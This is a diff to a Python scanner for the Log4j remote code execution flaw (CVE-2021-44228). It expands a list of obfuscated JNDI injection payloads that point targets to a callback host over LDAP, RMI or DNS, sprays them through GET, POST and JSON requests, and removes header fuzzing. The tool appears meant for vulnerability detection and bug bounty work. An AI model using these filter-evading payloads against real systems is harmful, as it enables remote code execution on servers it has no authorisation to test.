@@ -31,23 +31,13 @@ except Exception:
     pass
 
 
-cprint('[•] CVE-2021-44228 - Apache Log4j RCE Exception Scanner', "green")
-cprint('[•] Scanner provided by CyberQueenMeg', "yellow")
+cprint('[•] CVE-2021-44228 - Apache Log4j RCE Exception Scanner', "magenta")
+cprint('[•] Scanner provided by CyberQueenMeg', "cyan")
 
 
 if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
-
-
-default_headers = {
-    'User-Agent': '[Bug Bounty] CyberQueenMeg',
-    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
-    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
-}
-post_data_parameters = ["username", "user", "email", "email_address", "password", "search"]
-timeout = 4
-
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -60,51 +50,35 @@ parser.add_argument("-p", "--proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
-                    help="Check a list of URLs. - default urls.txt",
-                    default="urls.txt",
+                    help="Check a list of URLs.",
                     action='store')
-parser.add_argument("--headers-file",
-                    dest="headers_file",
-                    help="Headers fuzzing list - [default: headers.txt].",
-                    default="headers.txt",
-                    action='store')
-parser.add_argument("--wait-time",
+parser.add_argument("-w", "--wait-time", 
                     dest="wait_time",
                     help="Wait time after all URLs are processed (in seconds) - [Default: 60].",
                     default=60,
                     type=int,
                     action='store')
-parser.add_argument("--callback-url",
+parser.add_argument("-c", "--callback-url",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
-parser.add_argument("--threads",
+parser.add_argument("-t", "--threads",
                     dest="threads",
-                    help="Num threads for concurrent scanning - [Default: 30].",
-                    default=30,
+                    help="Num threads for concurrent scanning - [Default: 2].",
+                    default=2,
                     type=int,
                     action='store')
 
 
 args = parser.parse_args()
+        
 
+post_data_parameters = ["username", "user", "email", "email_address", "password", "search"]
+timeout = 4
 
 proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
-
-def get_fuzzing_headers(payload):
-    fuzzing_headers = {}
-    fuzzing_headers.update(default_headers)
-    with open(args.headers_file, "r") as f:
-        for i in f.readlines():
-            i = i.strip()
-            if i == "" or i.startswith("#"):
-                continue
-            fuzzing_headers.update({i: payload})
-
-    fuzzing_headers["Referrer"] = f'https://{fuzzing_headers["Referrer"]}'
-    return fuzzing_headers
 
 
 def get_fuzzing_post_data(payload):
@@ -123,7 +97,7 @@ def parse_url(url):
     url = url.replace(' ', '%20')
 
     if ('://' not in url):
-        url = str("http://") + str(url)
+        url = str("https://") + str(url)
     scheme = urlparse.urlparse(url).scheme
 
     # FilePath: /login.jsp
@@ -139,7 +113,7 @@ def parse_url(url):
 
 
 def scan_url(url, callback_host):
-    cprint(f"[•] URL: {url}", "green")
+    cprint(f"[•] URL: {url}", "magenta")
     parsed_url = parse_url(url)
     payload0 = "${jndi:ldap://"+callback_host+"]"
     payload1 = "{${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}"
@@ -155,14 +129,43 @@ def scan_url(url, callback_host):
     payload11 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}"
     payload12 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}"
     payload13 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}"
-    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13]
+    payload14 = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}"+callback_host+"}"
+    payload15 = "${jndi:dns:/"+callback_host+"}" #thanks to @christian-tallon
+    payload16 = "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://"+callback_host+"}" #thanks to @christian-tallon
+    payload17 = "${jndi:rmi://"+callback_host+"}" #thanks to @christian-tallon
+    payload18 = "${${lower:jndi}:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
+    payload19 = "${${lower:${lower:jndi}}:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
+    payload20 = "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://"+callback_host+"}" #thanks to @christian-tallon
+    payload21 = "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://"+callback_host+"}" #thanks to @christian-tallon
+    payload22 = "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://"+callback_host+"}" #thanks to @christian-tallon
+    payload23 = "${jndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}" #thanks to @christian-tallon
+    payload24 = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//"+callback_host+"}" #thanks to @christian-tallon
+    payload25 = "${jn${env::-}di:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload26 = "${jn${date:}di${date:':'}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload27 = "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload28 = "${j${main:\k5:-Nd}i${spring:k5:-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload29 = "${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload30 = "${j${::-nD}i${::-:}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload31 = "${j${EnV:K5:-nD}i:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload32 = "${j${loWer:Nd}i${uPper::}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload33 = "${jndi:ldap://127.0.0.1#"+callback_host+"}" #thanks to @christian-tallon
+    payload34 = "${jnd${upper:ı}:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload35 = "${jnd${sys:SYS_NAME:-i}:ldap:/"+callback_host+"}" #thanks to @christian-tallon
+    payload36 = "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload37 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}" #thanks to @christian-tallon
+    payload38 = "${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload39 = "${\u006a\u006e\u0064\u0069:ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload40 = "${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}."+callback_host+"}" #thanks to @christian-tallon
+    payload41 = "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://"+callback_host+"}" #thanks to @christian-tallon
+    payload42 = "%24%7Bjndi:ldap://"+callback_host+"%7D" #thanks to @christian-tallon
+    payload43 = "%24%7Bjn$%7Benv::-%7Ddi:ldap://"+callback_host+"%7D" #thanks to @christian-tallon
+    payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13, payload14, payload15, payload16, payload17, payload18, payload19, payload20, payload21, payload22, payload23, payload24, payload25, payload26, payload27, payload28, payload29, payload30, payload31, payload32, payload33, payload34, payload35, payload36, payload37, payload38, payload39, payload40, payload41, payload42, payload43]
     for payload in payloads:
         cprint(f"[•] PAYLOAD: {payload}", "cyan")
         try:
             requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
-                                headers=get_fuzzing_headers(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=True,
@@ -176,7 +179,6 @@ def scan_url(url, callback_host):
             requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
-                                headers=get_fuzzing_headers(payload),
                                 data=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
@@ -190,7 +192,6 @@ def scan_url(url, callback_host):
             requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
-                                headers=get_fuzzing_headers(payload),
                                 json=get_fuzzing_post_data(payload),
                                 verify=False,
                                 timeout=timeout,
@@ -223,7 +224,7 @@ def main():
             exe.submit(scan_url, url, callback_host)
 
     if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "magenta")
         return
 
 
